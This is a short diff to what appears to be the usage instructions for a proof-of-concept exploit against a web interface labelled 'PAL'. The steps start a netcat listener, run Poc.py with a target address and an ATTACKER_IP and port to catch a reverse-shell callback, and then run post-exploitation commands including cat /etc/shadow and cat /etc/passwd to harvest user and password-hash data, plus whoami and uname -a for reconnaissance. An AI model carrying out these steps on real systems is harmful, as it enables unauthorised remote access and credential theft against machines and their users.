@@ -32,7 +32,9 @@
     run command: `nc -lvnp 63842`
 3. run python:
     `python Poc.py https://<TARGET_PAL_WEB_INTERFACE_IP> <ATTACKER_IP> <ATTACKER_PORT>` # Random high port chosen in script from above
-4. once exploit is through, look at initial listener and wait for callback to catch. once callback catches perform; `whoami`, `ifconfig`
+4. once exploit is through, look at initial listener and wait for callback to catch. once callback catches perform; 
     run command:
+    `whoami` # detect who we are
     `cat /etc/shadow` # grab the users on the machine
     `cat /etc/passwd` # grab what shell permissions every user has
+    `uname -a` # detect what machine we are running
